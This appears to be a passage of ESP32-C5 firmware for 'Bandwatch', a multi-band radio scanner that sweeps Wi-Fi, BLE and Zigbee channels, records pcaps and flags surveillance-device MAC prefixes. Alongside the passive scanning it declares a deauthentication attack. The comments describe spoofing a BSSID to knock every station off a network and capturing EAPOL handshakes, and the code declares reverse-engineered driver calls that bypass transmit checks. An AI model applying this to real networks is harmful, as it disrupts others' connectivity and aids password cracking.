#include "bandwatch.h"
#include "devices.h"

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <BLEDevice.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <host/ble_gap.h>
#include <nimble/hci_common.h>
#include <math.h>
#include <string.h>
#include <sdkconfig.h>
#include <esp_system.h>
#include <esp_ieee802154.h>
#include <SPI.h>
#include <FS.h>
#include <SD.h>

#if !CONFIG_SOC_WIFI_SUPPORT_5G
#error "Bandwatch needs a 5 GHz capable target (ESP32-C5). Select 'ESP32C5 Dev Module'."
#endif

namespace {

// ---------------------------------------------------------------------------------------------
// Tunables
// ---------------------------------------------------------------------------------------------
constexpr const char* kVersion = "1.5";
constexpr uint32_t kDwellMs = 220;          // Dwell per channel (200–400 ms)
constexpr uint32_t kUiIntervalMs = 120;     // UI refresh cadence
constexpr int kStrongThresholdDbm = -65;    // "Strong" frame threshold
constexpr float kBusyEmaAlpha = 0.22f;      // Smoothing within required 0.15–0.30
constexpr int kUniqueSlots = 24;            // Best-effort unique transmitter slots
constexpr int kRgbPin = 8;                  // Onboard WS2812B data pin (Waveshare ESP32-C5-LCD-1.47)
constexpr int kBootButtonPin = 28;          // BOOT key = GPIO28 strap; free to use as an input after boot
constexpr uint32_t kLongPressMs = 700;      // Hold BOOT this long to cycle band mode (or stop a hunt)
constexpr uint32_t kApUpdateMs = 3000;      // AP count refresh cadence
constexpr uint32_t kDevListMs = 2000;       // Device table -> host cadence
constexpr uint32_t kDevFreshMs = 60000;     // Devices older than this are not reported
constexpr uint32_t kDevLcdFreshMs = 20000;  // ... nor shown on the LCD
constexpr uint32_t kBleActiveWindowMs = 4000;   // how long to scan actively after a new scannable device
constexpr uint32_t kBleSwitchMinMs = 2000;      // never flip the scan mode more often than this
constexpr const char* kCountryCode = "EU";  // Only affects the regulatory table; we never transmit.
constexpr uint32_t kDeauthMaxMs = 5UL * 60UL * 1000UL;  // Dead-man's switch: auto-stop a deauth attack after this long
                                                         // even if the host/serial link drops mid-attack.

// Channels to sweep. The C5 has ONE radio, so bands are time-shared: a "both" sweep simply
// interleaves 2.4 GHz channels 1-13 with the 5 GHz list below (38 dwells, ~8.4 s per sweep).
// 5 GHz: UNII-1 (36–48), UNII-2A (52–64, DFS), UNII-2C (100–144, DFS), UNII-3 (149–165).
// Receiving on DFS channels is passive; the radio never transmits in promiscuous mode.
// Channels the driver refuses (ESP_ERR_INVALID_ARG) are skipped automatically.
// Modes: three Wi-Fi sweeps, Bluetooth LE scanning, and IEEE 802.15.4 (Zigbee / Thread) sniffing on
// channels 11-26. All share the single 2.4/5 GHz radio, so only one runs at a time.
enum BandMode : uint8_t { BAND_5G = 0, BAND_24G = 1, BAND_BOTH = 2, BAND_BLE = 3, BAND_154 = 4 };
constexpr int kBandModes = 5;
constexpr const char* kBandName[] = {"5g", "2.4g", "both", "ble", "154"};
enum ChanBand : uint8_t { CB_24G = 0, CB_5G = 1, CB_154 = 2 };
constexpr uint8_t kChannels[] = {
    1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13,
    36, 40, 44, 48,
    52, 56, 60, 64,
    100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144,
    149, 153, 157, 161, 165,
    11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26,   // 802.15.4
};
constexpr uint8_t kChanBand[] = {
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
    2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2,
};
constexpr int kChannelCount = sizeof(kChannels) / sizeof(kChannels[0]);
static_assert(sizeof(kChanBand) == kChannelCount, "channel tables out of sync");
inline bool is5g(int idx) { return kChanBand[idx] == CB_5G; }
inline bool is154(int idx) { return kChanBand[idx] == CB_154; }
constexpr int kGroupStart[] = {0, 13, 21, 33, 38};

// Allow every 5 GHz channel the driver knows about (bits 1..28, see wifi_5g_channel_bit_t).
constexpr uint32_t kAll5gChannelMask = 0x1FFFFFFEu;

// Frame capture (streamed to the host over USB serial as base64 lines, host writes the pcap).
constexpr int kCapSlotsMax = 20;
constexpr int kCapSlotsMin = 4;
constexpr uint16_t kCapMaxLen = 1600;
constexpr uint32_t kCapHeapReserve = 14000;   // keep this much heap free after allocating the ring

// microSD pcap sink. The card is on the LCD's SPI bus (CS GPIO4); both are driven from the loop task and
// every LCD op is wrapped in beginTransaction/endTransaction, so sharing is safe. FATFS here is built with
// 4096-byte sectors, so buffer whole sectors before writing.
constexpr int kSdCsPin = 4;
constexpr uint32_t kSdSpiHz = 20000000;       // SD over SPI; the LCD runs the same bus at 40 MHz
constexpr size_t kSdBufSize = 4096;           // == CONFIG_FATFS_SECTOR_4096
constexpr uint32_t kSdFlushMs = 5000;         // fsync cadence: a power cut costs at most this much capture
constexpr uint32_t kSdBudgetUs = 8000;        // max time per loop spent writing, so channel hopping keeps time

// LCD pages
enum Page : int { PAGE_OVERVIEW = 0, PAGE_CHANNELS, PAGE_DEVICES, PAGE_HUNT, PAGE_SYSTEM, PAGE_COUNT };
constexpr int kDevRows = 12;

// ---------------------------------------------------------------------------------------------
// Colours
// ---------------------------------------------------------------------------------------------
inline lv_color_t c565(uint16_t v) {
    const uint8_t r5 = (v >> 11) & 0x1F;
    const uint8_t g6 = (v >> 5) & 0x3F;
    const uint8_t b5 = v & 0x1F;
    const uint8_t r8 = (uint16_t(r5) * 255) / 31;
    const uint8_t g8 = (uint16_t(g6) * 255) / 63;
    const uint8_t b8 = (uint16_t(b5) * 255) / 31;
    return lv_color_make(r8, g8, b8);
}

constexpr uint16_t BG_565      = 0x0122; // deep blue/black
constexpr uint16_t PANEL_565   = 0x0843; // muted navy
constexpr uint16_t WHITE_565   = 0xFFFF;
constexpr uint16_t BLACK_565   = 0x0000;
constexpr uint16_t GREEN_565   = 0x07E0;
constexpr uint16_t RED_565     = 0xF800;
constexpr uint16_t CYAN_565    = 0x07FF;
constexpr uint16_t GREY_565    = 0x8410;
constexpr uint16_t DIM_565     = 0x2124;
constexpr uint16_t YELLOW_565  = 0xFFE0;
constexpr uint16_t ORANGE_565  = 0xFD20;

struct RgbColor { uint8_t r; uint8_t g; uint8_t b; };
constexpr RgbColor LED_GREEN  = {0, 180, 40};
constexpr RgbColor LED_YELLOW = {255, 200, 0};
constexpr RgbColor LED_ORANGE = {255, 120, 0};
constexpr RgbColor LED_RED    = {255, 24, 0};
constexpr RgbColor LED_BLUE   = {0, 60, 255};
constexpr RgbColor LED_CYAN_L = {0, 190, 210};   // recording pcap to the host (Mac)
constexpr RgbColor LED_MAGENTA= {220, 0, 180};   // recording pcap to the microSD card
constexpr RgbColor LED_WHITE  = {210, 210, 210}; // both sinks at once

// ---------------------------------------------------------------------------------------------
// State
// ---------------------------------------------------------------------------------------------
struct Accum {
    uint32_t frames = 0;
    uint32_t bytes = 0;
    uint16_t strong = 0;
    uint16_t unique = 0;
    uint16_t macHashes[kUniqueSlots] = {0};
    uint8_t macFill = 0;
};

struct ChannelMetrics {
    uint32_t frames = 0;
    uint32_t bytes = 0;
    uint16_t strong = 0;
    uint16_t unique = 0;
};

struct ChannelState {
    ChannelMetrics metrics;
    float busyCurrent = 0.0f;  // Last dwell busy score (0–100)
    float busyEma = 0.0f;      // Smoothed busy score (0–100)
    bool hasData = false;
    bool unavailable = false;  // Driver rejected esp_wifi_set_channel for this channel
};

// IEEE 802.11 header (truncated – enough to read transmitter address)
typedef struct {
    uint16_t frame_ctrl;
    uint16_t duration_id;
    uint8_t addr1[6];
    uint8_t addr2[6];
    uint8_t addr3[6];
    uint16_t seq_ctrl;
    uint8_t addr4[6];
} wifi_ieee80211_mac_hdr_t;

typedef struct {
    wifi_ieee80211_mac_hdr_t hdr;
    uint8_t payload[0];
} wifi_ieee80211_packet_t;

struct CapFrame {
    uint32_t ts_us;
    uint16_t len;      // original MPDU length (sig_len)
    uint16_t capLen;   // bytes stored
    int8_t rssi;
    uint8_t channel;
    uint8_t data[kCapMaxLen];
};

volatile Accum g_accum;
portMUX_TYPE g_accumMux = portMUX_INITIALIZER_UNLOCKED;
portMUX_TYPE g_devMux = portMUX_INITIALIZER_UNLOCKED;

WifiDev wifiDevs[kWifiDevSlots];
BleDev bleDevs[kBleDevSlots];
Dev154 devs154[kDev154Slots];

// Hunt target, tracked from all three radios. huntMac = 6-byte MAC (Wi-Fi/BLE);
// huntKey = 802.15.4 key (extended address, or 0xFF 0xFE pan short marker form).
uint8_t huntMac[6] = {0};
uint8_t huntKey[8] = {0};
uint8_t huntKind = 0;   // 0 MAC, 1 802.15.4 key
volatile bool huntActive = false;
volatile int8_t huntRssi = -127;
volatile uint32_t huntLastMs = 0;
volatile uint32_t huntCount = 0;
char huntLabel[33] = "";
bool huntParked = false;

// Deauth attack: spoof a BSSID and broadcast deauth/disassoc frames until stopped, so every station on that
// network drops (they usually reconnect — with capture running you can grab the EAPOL handshakes).
uint8_t deauthBssid[6] = {0};
volatile bool deauthActive = false;
bool deauthParked = false;      // like huntParked: we hold the park on the target's channel
volatile uint32_t deauthSent = 0, deauthTxFail = 0;
uint32_t deauthStartMs = 0;     // millis() when the current attack started; serviceDeauth enforces kDeauthMaxMs
bool deauthDumped = false;      // DIAGNOSTIC: dump the built frame once per attack

// DIAGNOSTIC: beacon-injection self-test (see sendTestBeacon below), toggled with "txtest 1".
volatile bool txTestActive = false;
uint32_t txTestSent = 0, txTestFail = 0;
// PROOF OF CONCEPT ONLY (not a feature): raw TX radiates nothing from an unassociated STA, so this brings
// up a SoftAP to give the MAC a real BSS context and injects from WIFI_IF_AP instead. Toggled with
// "softap 1". Tears down promiscuous sniffing while active — see docs/DEVELOPER.md section 11.
wifi_interface_t txIface = WIFI_IF_STA;
bool softApPoc = false;

// DIAGNOSTIC build 2: the driver-internal deauth path. These live in libnet80211.a with no public
// header. send_deauth_no_bss builds a deauth frame with the driver's own encoding (FC low byte 0xC0,
// i.e. a real "deauth" subtype on air) and TXes it via ic_tx_pkt, bypassing the raw-TX sanity check
// that rejects our hand-rolled [C0]/[A0] frames.
//   arg0: pointer to a word holding an ieee80211com* — g_ic+16 (STA) or g_ic+20 (AP); it panics on 0
//   arg1: target MAC (the station being kicked, ends up as DA), arg2: reason code
//
// Every numeric offset used by this path (g_ic+16/+20/+436/+440, hmac+312, desc+4/+20/+40/+52/+56) was
// reverse-engineered from the prebuilt libnet80211.a in Arduino-ESP32 core 3.3.11 (ESP-IDF 5.5.5). Nothing
// validates them at runtime, so a core that lays those structs out differently turns these reads and writes
// into memory corruption rather than a clean failure. Re-verify them before bumping the core (docs/DEVELOPER.md §9).
#if defined(ESP_ARDUINO_VERSION_MAJOR) && (ESP_ARDUINO_VERSION_MAJOR != 3 || ESP_ARDUINO_VERSION_MINOR != 3)
#warning "Arduino-ESP32 core is not 3.3.x: the driver-internal deauth offsets may no longer match (docs/DEVELOPER.md)."
#endif
extern "C" {
    int ieee80211_send_deauth_no_bss(void* hmacSlot, const uint8_t* mac, uint16_t reason);
    // DIAGNOSTIC build 3 pieces — the driver builds the frame itself; we only steer which MACs go where.
    void* ieee80211_alloc_deauth(void* hmacSlot, const uint8_t* macArg1, uint16_t reason);   // desc w/ reason at D+24, or NULL
    void  ieee80211_send_setup(void* hmacSlot, void* desc, int x, int y, const uint8_t* m4, const uint8_t* m5, const uint8_t* m6);
    void  ieee80211_set_tx_desc(void* hmacSlot, void* desc, int a, int b, int c);
    void  ic_tx_pkt(void* desc);
    extern void* g_ic;
}
// Word passed as arg0: holds the STA hmac pointer (g_ic+16). Padded so the driver's seq counter —
// which send_setup increments at &flag+210 — lands in our own memory instead of a random neighbor.
static uint8_t deauthSlotPad[256];
uint8_t deauthHstate = 0xFF;     // *hmac+312: picks the DA/SA/BSSID mapping inside send_setup (0 / 1 / 3)

// Single-producer (Wi-Fi task) / single-consumer (loop) ring buffer for captured frames.
// Allocated from the heap only while a capture runs (32 KB), so it costs nothing otherwise.
CapFrame* capRing = nullptr;
int capSlots = 0;
volatile uint8_t capHead = 0;     // next slot the producer writes
volatile uint8_t capTail = 0;     // next slot the consumer reads
bool trackAddr1 = true;                 // tier-1 receiver-side sightings (see trackWifiDevice)
volatile bool captureEnabled = false;   // USB sink
volatile bool capActive = false;        // either sink wants frames: the RX paths gate on this
bool sdMounted = false, sdCapEnabled = false;   // microSD sink (definitions further down)
bool sdReadActive = false;      // an sdread is streaming a file out (definitions further down)
bool sdCardPresent = false;     // seen at boot; FATFS is only mounted while the card is actually in use
uint32_t sdCardMb = 0;          // cached so hello can report it without mounting
File sdFile;
uint8_t* sdBuf = nullptr;
size_t sdBufLen = 0;
uint32_t sdFrames = 0, sdBytes = 0, sdDropped = 0, sdLastFlushMs = 0, sdErrors = 0;
char sdPath[48] = "";
// Wall clock: the host sends "time <epoch>"; without it timestamps fall back to uptime (1970-based).
uint32_t epochBase = 0;         // epoch seconds at millis() == epochBaseMs
uint32_t epochBaseMs = 0;
bool epochValid = false;
volatile uint16_t capSnapLen = kCapMaxLen;
volatile uint32_t capDropped = 0;
uint32_t capSent = 0;
volatile uint8_t currentChannelNum = 0;
BandMode bandMode = BAND_5G;

bool r154Running = false;
inline bool wifiMode() { return bandMode <= BAND_BOTH; }
inline bool mode154() { return bandMode == BAND_154; }
inline bool hopMode() { return wifiMode() || mode154(); }   // modes that sweep channels
inline bool chanEnabled(int idx) {
    switch (bandMode) {
        case BAND_5G:   return is5g(idx);
        case BAND_24G:  return kChanBand[idx] == CB_24G;
        case BAND_BOTH: return !is154(idx);
        case BAND_154:  return is154(idx);
        default:        return false;
    }
}
int enabledCount() {
    int n = 0;
    for (int i = 0; i < kChannelCount; i++) if (chanEnabled(i)) n++;
    return n;
}

ChannelState channels[kChannelCount];
int currentIdx = 0;                 // Index into kChannels
int parkedIdx = -1;                 // >= 0: stay on this channel instead of hopping
uint32_t dwellStartedMs = 0;
uint32_t sweepCount = 0;
bool monitorReady = false;
bool wifiRunning = false;
esp_err_t errCountry = ESP_FAIL, errBand = ESP_FAIL, errProto = ESP_FAIL, errPromisc = ESP_FAIL;

// BLE
bool bleInited = false;
volatile bool bleScanDone = false;
uint32_t bleScanCycles = 0;
volatile uint32_t bleAdvSeen = 0;   // advertising reports received (one per on-air packet)
// Scan policy. Passive only listens; active sends SCAN_REQ and so collects the scan responses that carry
// most device names, at the cost of putting us on the air. "auto" stays passive and opens a short active
// window when a new *scannable* address shows up with no name yet - enough to learn the name, then quiet
// again. The mode is frozen while a capture runs so one pcap is not half passive and half active.
enum BleScanMode : uint8_t { BLE_SCAN_PASSIVE = 0, BLE_SCAN_ACTIVE = 1, BLE_SCAN_AUTO = 2 };
BleScanMode bleScanMode = BLE_SCAN_AUTO;
bool bleActiveScan = false;              // what discovery is actually running right now
volatile uint32_t bleActiveUntilMs = 0;  // auto mode: stay active until this millis()
uint32_t bleLastSwitchMs = 0;
uint32_t bleSwitches = 0;
const char* bleScanModeName() {
    return bleScanMode == BLE_SCAN_ACTIVE ? "active" : bleScanMode == BLE_SCAN_PASSIVE ? "passive" : "auto";
}
uint32_t bleStatusMs = 0;

// UI objects
lv_obj_t* pages[PAGE_COUNT] = {nullptr};
int currentPage = 0;
// overview
lv_obj_t* chanLabel = nullptr;
lv_obj_t* globalBar = nullptr;
lv_obj_t* globalLabel = nullptr;
lv_obj_t* sweepLabel = nullptr;
lv_obj_t* topRows[3] = {nullptr};
lv_obj_t* topRates[3] = {nullptr};
lv_obj_t* topBars[3] = {nullptr};
lv_obj_t* specBars[kChannelCount] = {nullptr};
lv_obj_t* specLabel = nullptr;
lv_obj_t* statsLine1 = nullptr;
lv_obj_t* statsLine2 = nullptr;
lv_obj_t* footLabel = nullptr;
// channels
lv_obj_t* listChanLabel = nullptr;
constexpr int kListSlots = 39;   // 3 columns x 13 rows
lv_obj_t* listRow[kListSlots] = {nullptr};
lv_obj_t* listName[kListSlots] = {nullptr};
lv_obj_t* listBar[kListSlots] = {nullptr};
lv_obj_t* listVal[kListSlots] = {nullptr};
lv_obj_t* listFoot = nullptr;
// devices
lv_obj_t* devHdrRight = nullptr;
lv_obj_t* devRow[kDevRows] = {nullptr};
lv_obj_t* devName[kDevRows] = {nullptr};
lv_obj_t* devRssi[kDevRows] = {nullptr};
lv_obj_t* devBar[kDevRows] = {nullptr};
lv_obj_t* devFoot = nullptr;
// hunt
lv_obj_t* huntHdrRight = nullptr;
lv_obj_t* huntBig = nullptr;
lv_obj_t* huntBar = nullptr;
lv_obj_t* huntMacLbl = nullptr;
lv_obj_t* huntNameLbl = nullptr;
lv_obj_t* huntInfo1 = nullptr;
lv_obj_t* huntInfo2 = nullptr;
lv_obj_t* huntHint = nullptr;
// system
constexpr int kSysLines = 14;
lv_obj_t* sysLines[kSysLines] = {nullptr};

uint16_t lastApSeen = 0;
uint16_t apMaxWindow = 0;
uint32_t apWindowStartedMs = 0;

// ---------------------------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------------------------
inline void setLedColor(const RgbColor& c, uint8_t brightness = 60) {
    const uint16_t scale = static_cast<uint16_t>(brightness) * 255 / 100;
    const uint8_t r = static_cast<uint8_t>((static_cast<uint16_t>(c.r) * scale) / 255);
    const uint8_t g = static_cast<uint8_t>((static_cast<uint16_t>(c.g) * scale) / 255);
    const uint8_t b = static_cast<uint8_t>((static_cast<uint16_t>(c.b) * scale) / 255);
    rgbLedWrite(kRgbPin, r, g, b);  // Arduino-ESP32 built-in WS2812 driver (RMT), GRB order
}

inline float clamp01(float v) {
    if (v < 0.0f) return 0.0f;
    if (v > 1.0f) return 1.0f;
    return v;
}

inline uint16_t macHash(const uint8_t* mac) {
    return (static_cast<uint16_t>(mac[4]) << 8) | mac[5];
}

lv_color_t scoreColor(float s) {
    if (s > 70.0f) return c565(RED_565);
    if (s > 40.0f) return c565(YELLOW_565);
    return c565(GREEN_565);
}

lv_color_t rssiColor(int rssi) {
    if (rssi >= -50) return c565(RED_565);
    if (rssi >= -65) return c565(ORANGE_565);
    if (rssi >= -80) return c565(YELLOW_565);
    return c565(CYAN_565);
}

void fmtRate(char* out, size_t n, float perSec, const char* unit) {
    if (perSec >= 10000.0f) snprintf(out, n, "%.0fk%s", perSec / 1000.0f, unit);
    else if (perSec >= 1000.0f) snprintf(out, n, "%.1fk%s", perSec / 1000.0f, unit);
    else snprintf(out, n, "%.0f%s", perSec, unit);
}

void fmtMac(char* out, size_t n, const uint8_t* m) {
    snprintf(out, n, "%02x:%02x:%02x:%02x:%02x:%02x", m[0], m[1], m[2], m[3], m[4], m[5]);
}

bool parseMac(const char* s, uint8_t* out) {
    unsigned v[6];
    if (sscanf(s, "%2x:%2x:%2x:%2x:%2x:%2x", &v[0], &v[1], &v[2], &v[3], &v[4], &v[5]) != 6 &&
        sscanf(s, "%2x-%2x-%2x-%2x-%2x-%2x", &v[0], &v[1], &v[2], &v[3], &v[4], &v[5]) != 6) return false;
    for (int i = 0; i < 6; i++) out[i] = static_cast<uint8_t>(v[i]);
    return true;
}

// Replace control characters in a string captured off the air (SSID, BLE name, country code) with '.'.
// Bytes >= 0x80 are left alone so UTF-8 names survive. Without this a hostile or corrupt beacon can put
// control bytes in the table, where printJsonStr expands each to a 6-byte \u escape and blows past the
// serialRoom() budget that keeps JSON lines from being truncated mid-write.
void IRAM_ATTR sanitizeText(char* s, size_t n) {
    for (size_t i = 0; i < n && s[i]; i++) {
        const unsigned char c = static_cast<unsigned char>(s[i]);
        if (c < 0x20 || c == 0x7F) s[i] = '.';
    }
}

inline void putLE16(uint8_t* p, uint16_t v) { p[0] = v; p[1] = v >> 8; }
inline void putLE32(uint8_t* p, uint32_t v) { p[0] = v; p[1] = v >> 8; p[2] = v >> 16; p[3] = v >> 24; }

// Known surveillance hardware, matched on the first three MAC bytes. Sources: colonelpanichacks/
// ouispy-detector (ouis.md) and the Flock Safety prefixes researched by OrdoOuroboros / @NitekryDPaul
// via flock-you. An OUI match is evidence, not proof: prefixes get reassigned, and two entries in the
// Flock set were withdrawn upstream as Ubiquiti false positives. Treat a hit as "worth a look".
enum SurvCat : uint8_t { SURV_NONE = 0, SURV_FLOCK = 1, SURV_RING = 2, SURV_AXON = 3,
                         SURV_DJI = 4, SURV_PARROT = 5, SURV_SKYDIO = 6, SURV_META = 7 };
constexpr const char* kSurvName[] = {"", "Flock Safety", "Ring", "Axon", "DJI", "Parrot", "Skydio", "Meta/Ray-Ban"};
struct SurvOui { uint8_t o[3]; uint8_t cat; };
constexpr SurvOui kSurvOuis[] = {
    {{0x00, 0xF4, 0x8D}, 1},   // FLOCK
    {{0x08, 0x3A, 0x88}, 1},   // FLOCK
    {{0x14, 0x5A, 0xFC}, 1},   // FLOCK
    {{0x14, 0xB5, 0xCD}, 1},   // FLOCK
    {{0x24, 0xB2, 0xB9}, 1},   // FLOCK
    {{0x3C, 0x71, 0xBF}, 1},   // FLOCK
    {{0x3C, 0x91, 0x80}, 1},   // FLOCK
    {{0x48, 0x27, 0xEA}, 1},   // FLOCK
    {{0x58, 0x00, 0xE3}, 1},   // FLOCK
    {{0x58, 0x8E, 0x81}, 1},   // FLOCK
    {{0x5C, 0x93, 0xA2}, 1},   // FLOCK
    {{0x64, 0x6E, 0x69}, 1},   // FLOCK
    {{0x70, 0x08, 0x94}, 1},   // FLOCK
    {{0x70, 0xC9, 0x4E}, 1},   // FLOCK
    {{0x74, 0x4C, 0xA1}, 1},   // FLOCK
    {{0x80, 0x30, 0x49}, 1},   // FLOCK
    {{0x82, 0x6B, 0xF2}, 1},   // FLOCK
    {{0x90, 0x35, 0xEA}, 1},   // FLOCK
    {{0x94, 0x08, 0x53}, 1},   // FLOCK
    {{0x9C, 0x2F, 0x9D}, 1},   // FLOCK
    {{0xA4, 0xCF, 0x12}, 1},   // FLOCK
    {{0xB4, 0x1E, 0x52}, 1},   // FLOCK
    {{0xB8, 0x1E, 0xA4}, 1},   // FLOCK
    {{0xB8, 0x35, 0x32}, 1},   // FLOCK
    {{0xC0, 0x35, 0x32}, 1},   // FLOCK
    {{0xD0, 0x39, 0x57}, 1},   // FLOCK
    {{0xD8, 0xF3, 0xBC}, 1},   // FLOCK
    {{0xE0, 0x0A, 0xF6}, 1},   // FLOCK
    {{0xE0, 0x4F, 0x43}, 1},   // FLOCK
    {{0xE4, 0xAA, 0xEA}, 1},   // FLOCK
    {{0xE8, 0xD0, 0xFC}, 1},   // FLOCK
    {{0xEC, 0x1B, 0xBD}, 1},   // FLOCK
    {{0xF4, 0x6A, 0xDD}, 1},   // FLOCK
    {{0x18, 0x7F, 0x88}, 2},   // RING
    {{0x24, 0x2B, 0xD6}, 2},   // RING
    {{0x34, 0x3E, 0xA4}, 2},   // RING
    {{0x54, 0xE0, 0x19}, 2},   // RING
    {{0x5C, 0x47, 0x5E}, 2},   // RING
    {{0x64, 0x9A, 0x63}, 2},   // RING
    {{0x90, 0x48, 0x6C}, 2},   // RING
    {{0x9C, 0x76, 0x13}, 2},   // RING
    {{0xAC, 0x9F, 0xC3}, 2},   // RING
    {{0xC4, 0xDB, 0xAD}, 2},   // RING
    {{0xCC, 0x3B, 0xFB}, 2},   // RING
    {{0x00, 0x25, 0xDF}, 3},   // AXON
    {{0x04, 0xA8, 0x5A}, 4},   // DJI
    {{0x0C, 0x9A, 0xE6}, 4},   // DJI
    {{0x34, 0xD2, 0x62}, 4},   // DJI
    {{0x48, 0x1C, 0xB9}, 4},   // DJI
    {{0x58, 0xB8, 0x58}, 4},   // DJI
    {{0x60, 0x60, 0x1F}, 4},   // DJI
    {{0x8C, 0x58, 0x23}, 4},   // DJI
    {{0xE4, 0x7A, 0x2C}, 4},   // DJI
    {{0x00, 0x12, 0x1C}, 5},   // PARROT
    {{0x00, 0x26, 0x7E}, 5},   // PARROT
    {{0x90, 0x03, 0xB7}, 5},   // PARROT
    {{0x90, 0x3A, 0xE6}, 5},   // PARROT
    {{0xA0, 0x14, 0x3D}, 5},   // PARROT
    {{0x38, 0x1D, 0x14}, 6},   // SKYDIO
    {{0x5C, 0xE9, 0x1E}, 7},   // META
    {{0x7C, 0x2A, 0x9E}, 7},   // META
    {{0x98, 0x59, 0x49}, 7},   // META
    {{0xCC, 0x66, 0x0A}, 7},   // META
    {{0xF4, 0x03, 0x43}, 7},   // META
};
constexpr int kSurvOuiCount = sizeof(kSurvOuis) / sizeof(kSurvOuis[0]);

uint8_t survLookup(const uint8_t* mac) {
    for (int i = 0; i < kSurvOuiCount; i++)
        if (kSurvOuis[i].o[0] == mac[0] && kSurvOuis[i].o[1] == mac[1] && kSurvOuis[i].o[2] == mac[2])
            return kSurvOuis[i].cat;
    return SURV_NONE;
}

// Write a JSON string literal (quoted, escaped) to Serial.
void printJsonStr(const char* s) {
    Serial.write('"');
    for (; *s; s++) {
        const unsigned char c = static_cast<unsigned char>(*s);
        if (c == '"' || c == '\\') { Serial.write('\\'); Serial.write(c); }
        else if (c < 0x20) { Serial.printf("\\u%04x", c); }
        else Serial.write(c);
    }
    Serial.write('"');
}

// Non-blocking serial policy: the USB CDC TX buffer is large (see setup) and writes never block. To avoid
// half-written lines when the host is slow or absent, every line checks for room first and is dropped whole.
inline bool serialRoom(size_t n) { return static_cast<size_t>(Serial.availableForWrite()) >= n; }

// ---------------------------------------------------------------------------------------------
// Promiscuous RX path (runs in the Wi-Fi task: count, hash, track, optionally copy – nothing else)
// ---------------------------------------------------------------------------------------------
// Parse the information elements of a beacon / probe response into the AP record.
// Body layout: 8 timestamp + 2 interval + 2 capability, then tagged parameters (id, len, data...).
void IRAM_ATTR parseBeaconIes(WifiDev& d, const uint8_t* payload, uint16_t sigLen) {
    if (sigLen < 36 + 4) return;   // header + fixed fields + FCS
    const uint16_t cap = payload[34] | (payload[35] << 8);
    const bool privacy = cap & 0x10;
    uint8_t sec = 0, pmf = 0, phy = 0, bw = 2;
    bool sawRsn = false, sawWpa = false;
    uint16_t off = 36;
    const uint16_t end = sigLen - 4;   // exclude FCS
    while (off + 2 <= end) {
        const uint8_t id = payload[off];
        const uint8_t len = payload[off + 1];
        const uint8_t* v = payload + off + 2;
        if (off + 2 + len > end) break;
        switch (id) {
            case 0:   // SSID
                if (len > 0 && len <= 32) { memcpy(d.ssid, v, len); d.ssid[len] = 0; sanitizeText(d.ssid, len); }
                break;
            case 7:   // Country
                if (len >= 2) { d.cc[0] = v[0]; d.cc[1] = v[1]; d.cc[2] = 0; sanitizeText(d.cc, 2); }
                break;
            case 11:  // BSS load
                if (len >= 3) { d.stations = v[0] | (v[1] << 8); d.util = v[2]; }
                break;
            case 45: phy |= 2; break;                       // HT capabilities -> 802.11n
            case 61:                                        // HT operation: secondary channel offset
                if (len >= 2 && ((v[1] & 0x03) == 1 || (v[1] & 0x03) == 3) && (v[1] & 0x04)) bw = 4;
                break;
            case 191: phy |= 4; break;                      // VHT capabilities -> 802.11ac
            case 192:                                       // VHT operation: channel width
                if (len >= 3) {
                    if (v[0] == 1) bw = (v[2] != 0) ? 16 : 8;
                    else if (v[0] == 2 || v[0] == 3) bw = 16;
                }
                break;
            case 48: {                                      // RSN
                sawRsn = true;
                if (len < 8) break;
                uint16_t p = 2 + 4;                         // version + group cipher
                const uint16_t pc = v[p] | (v[p + 1] << 8);
                // 32-bit math: a bogus pairwise-cipher count would wrap a uint16 back into range and
                // make the checks below pass on garbage offsets.
                const uint32_t after = static_cast<uint32_t>(p) + 2u + 4u * pc;
                if (after + 2u > len) break;
                p = static_cast<uint16_t>(after);
                const uint16_t ac = v[p] | (v[p + 1] << 8); p += 2;
                for (uint16_t k = 0; k < ac && p + 4 <= len; k++, p += 4) {
                    if (!(v[p] == 0x00 && v[p + 1] == 0x0F && v[p + 2] == 0xAC)) continue;
                    switch (v[p + 3]) {
                        case 1: case 3: case 5: case 11: sec |= 0x08; break;   // 802.1X (WPA2-Enterprise family)
                        case 2: case 4: case 6:          sec |= 0x04; break;   // PSK (WPA2-Personal)
                        case 8: case 9:                  sec |= 0x10; break;   // SAE (WPA3-Personal)
                        case 12: case 13:                sec |= 0x20; break;   // Suite-B 192 (WPA3-Enterprise)
                        case 18:                         sec |= 0x40; break;   // OWE (Enhanced Open)
                        default: break;
                    }
                }
                if (p + 2 <= len) {
                    const uint16_t rsncap = v[p] | (v[p + 1] << 8);
                    pmf = (rsncap & 0x40) ? 2 : (rsncap & 0x80) ? 1 : 0;
                }
                break;
            }
            case 221: // vendor specific
                if (len >= 4 && v[0] == 0x00 && v[1] == 0x50 && v[2] == 0xF2 && v[3] == 0x01) { sawWpa = true; sec |= 0x02; }
                break;
            case 255: // element ID extension
                if (len >= 1) {
                    if (v[0] == 35) phy |= 8;               // HE capabilities -> 802.11ax
                    else if (v[0] == 108) phy |= 16;        // EHT capabilities -> 802.11be
                }
                break;
            default: break;
        }
        off += 2 + len;
    }
    if (!sawRsn && !sawWpa) sec |= privacy ? 0x01 : 0x80;   // WEP or open
    if (phy == 0) phy = 1;
    d.sec = sec;
    d.pmf = pmf;
    d.phy = phy;
    d.bw = bw;
    d.flags |= 2;
}

// destOnly: this MAC was the *destination* (addr1) of someone else's frame, so we have never heard it
// transmit. Tier 1 evidence - @NitekryDPaul's technique for devices like Flock cameras that sleep through
// most dwell windows and only ever appear as a recipient. It is deliberately weaker than a transmitter
// sighting: it must never evict a device we have actually heard, and it never overwrites signal data,
// because the RSSI belongs to whoever sent the frame, not to this device.
void IRAM_ATTR trackWifiDevice(const uint8_t* mac, int8_t rssi, uint8_t fc0, const uint8_t* payload,
                               uint16_t sigLen, bool destOnly = false) {
